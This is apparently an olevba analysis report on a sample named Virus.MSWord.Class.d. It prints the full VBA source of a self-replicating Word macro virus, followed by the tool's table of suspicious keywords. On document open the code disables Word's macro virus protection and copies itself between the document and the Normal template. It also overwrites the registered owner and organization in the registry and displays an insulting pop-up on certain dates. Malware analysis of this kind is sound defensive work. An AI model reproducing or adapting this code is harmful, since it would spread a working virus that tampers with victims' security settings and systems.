olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-bdfd94915c0a52b82e18c1afb549eedfb6bf54d9
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-bdfd94915c0a52b82e18c1afb549eedfb6bf54d9 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
Const REG_SZ As Long = 1
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
Const HKEY_CURRENT_USER As Long = &H80000001
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
Sub AutoOpen()
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
On Error GoTo out
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
Options.VirusProtection = False
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
Options.SaveNormalPrompt = False
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
Options.ConfirmConversions = False
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
If nt > 70 And ad > 0 Then GoTo out
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
If nt < 70 Then
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
End If
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
host.codemodule.AddFromFile ("c:\class.sys")
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
With host.codemodule
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    For x = 1 To 16
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    .deletelines 1
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    Next x
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
End With
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
If nt < 70 Then
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    With host.codemodule
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    .replaceline 1, "Sub AutoClose()"
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    .replaceline 91, "Sub ToolsMacro()"
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    For x = 70 To 81
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
        .deletelines 62
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    Next x
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    .replaceline 35, "    For x = 1 To 4"
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    End With
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
End If
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
If nt < 70 Then
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
u = RegCloseKey(k)
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
End If
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
With host.codemodule
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    For x = 2 To 104 Step 2
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
    Next x
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
End With
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
out:
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
End Sub
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
Sub ViewVBCode()
'Holme Colleges9/14/04 6:11:18 PM\\BCSERVER\HP LaserJet 2200 Series JCU602 on NE01:5
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
